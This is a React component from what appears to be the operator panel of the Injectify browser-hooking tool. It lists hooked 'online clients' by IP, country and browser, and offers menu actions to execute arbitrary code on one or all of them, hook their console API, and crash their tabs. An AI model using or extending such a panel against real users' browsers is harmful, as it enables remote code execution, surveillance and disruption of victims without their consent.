import ReactDOM, { render } from 'react-dom'
import React from 'react'
import { connect } from 'react-redux'

import { ContextMenu, MenuItem, ContextMenuTrigger } from 'react-contextmenu'
import ContainerDimensions from 'react-container-dimensions'
import copy from 'copy-to-clipboard'
import Rnd from 'react-rnd'
import Tooltip from 'material-ui/Tooltip'
import Button from 'material-ui/Button'
import List, { ListItem, ListItemIcon, ListItemText, ListSubheader } from 'material-ui/List'
import ComputerIcon from 'material-ui-icons/Computer'
import Graph from './Graph'

import { selectClient, toggleClientsList, execute } from '../../../../actions'

class Sidebar extends React.Component {
  triggerResize = (state = false) => {
    if (state) {
      this.dynamicResize = setInterval(() => {
        window.dispatchEvent(new Event('resize'))
      }, 50)
    } else {
      clearInterval(this.dynamicResize)
      window.dispatchEvent(new Event('resize'))
    }
  }

  selectClient = (token) => {
    const { dispatch, selectedProject } = this.props
    dispatch(selectClient(selectedProject.name, token))
    dispatch(toggleClientsList(false, true))
  }

  render() {
    const { projects, selectedProject, dispatch } = this.props
    const project = projects[selectedProject.index]
    const { state } = project.console
    const { clients } = state

    return (
      <Rnd
        bounds='parent'
        default={{ width: 220 }}
        enableResizing={{
          top: false,
          right: true,
          bottom: false,
          left: false,
          topRight: false,
          bottomRight: false,
          bottomLeft: false,
          topLeft: false
        }}
        onResizeStart={() => this.triggerResize(true)}
        onResizeStop={() => this.triggerResize(false)}
        disableDragging={true}
        className='inject-list-container'
        minWidth={180}
        maxWidth={550}
        resizeHandleClasses={{ right: 'resizer light' }}
      >
        <ListSubheader className='inject-list-header'>
          <ComputerIcon /> Online clients ({clients ? Object.keys(clients).length : 0})
        </ListSubheader>
        <ContainerDimensions>
          {({ width }) => (
            <div className="graph">
              <Graph width={width} />
              <Tooltip title='Execute code on all clients' placement='top'>
                <Button onClick={() => dispatch(execute(code.editor.getValue(), '*'))} className='execute-all'>
                  Execute all
                </Button>
              </Tooltip>
            </div>
          )}
        </ContainerDimensions>
        <List className="inject-clients">
          {clients && Object.keys(clients).map((token, i) => {
            const client = clients[token]
            return (
              <div key={token}>
                <ContextMenuTrigger id={token}>
                  <ListItem
                    button={state.selected !== token}
                    dense
                    component="li"
                    onClick={() => this.selectClient(token)}
                    className={state.selected === token ? 'active' : ''}>
                    <ListItemIcon>
                      <img src={client.images.country} />
                    </ListItemIcon>
                    <ListItemIcon>
                      <img src={client.images.browser} />
                    </ListItemIcon>
                    <ListItemText primary={client.ip.query} />
                  </ListItem>
                </ContextMenuTrigger>
                <ContextMenu id={token}>
                  <MenuItem  onClick={() => dispatch(execute(code.editor.getValue(), token))}>
                    Execute on all tabs
                  </MenuItem>
                  <MenuItem onClick={() => window.open(`https://www.iplocation.net/?query=${client.ip.query}`)}>
                    IP lookup
                  </MenuItem>
                  <MenuItem divider />
                  <MenuItem onClick={() => dispatch(execute(`injectify.console()`, token))}>
                    Hook / unhook console API
                  </MenuItem>
                  <MenuItem onClick={() => dispatch(execute(`injectify.module('crash')`, token))}>
                    Crash tabs
                  </MenuItem>
                </ContextMenu>
              </div>
            )
          })}
        </List>
      </Rnd>
    )
  }
}


export default connect(({ injectify: { projects, selectedProject } }) => ({ projects, selectedProject }))(Sidebar)
